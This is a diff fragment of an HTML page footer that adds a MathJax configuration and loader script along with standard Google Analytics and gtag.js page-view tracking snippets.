+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+    <!-- Google Analytics -->
+    <script defer>
+      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
+      ga.l = +new Date;
+      ga('create', 'UA-177243668-2', 'auto');
+      ga('send', 'pageview');
+    </script>
+    <script async src="https://www.google-analytics.com/analytics.js"></script>
+  
+
+  
+    <!-- Google gtag.js -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-177243668-2"></script>
+    <script defer>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-177243668-2');
+    </script>
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+</body>
+</html>
